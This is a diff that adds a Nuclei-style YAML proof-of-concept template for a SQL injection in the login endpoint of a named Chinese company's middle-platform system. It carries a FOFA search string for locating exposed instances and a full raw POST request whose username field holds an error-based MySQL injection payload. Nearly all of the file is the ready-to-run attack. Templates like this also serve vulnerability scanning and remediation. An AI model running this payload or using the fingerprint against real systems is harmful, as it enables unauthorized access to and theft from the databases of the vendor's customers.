@@ -1,0 +1,44 @@
+id: poc-ea621de9nwth6e73
+info:
+  name: 北京中犇科技有限公司数字化智能中台系统login存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ea621de9nwth6e73'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ea621de9nwth6e73
+    fofa: body="/member/get_verify_code/get_code" || icon_hash="1056416905"
+http:
+- raw:
+  - 'POST /login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Content-Length: 198
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: max-age=0
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: PHPSESSID=ctrt7ov1do3pboh2bdgskf88po; Hm_lvt_d69712fd2123f4acdea2e8da51577cff=1735261850; Hm_lpvt_d69712fd2123f4acdea2e8da51577cff=1735261850; HMACCOUNT=F3A0D49D22D0A4BB
+
+    Upgrade-Insecure-Requests: 1
+
+
+    username='' AND GTID_SUBSET(CONCAT(0x71627a7171,(SELECT (ELT(3088=3088,1))),0x7176766271),3088) AND ''wxEf''=''wxEf&loginType=1&password=21232f297a57a5a743894a0e4a801fc3&phone_head=86&wx_openid=&member='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
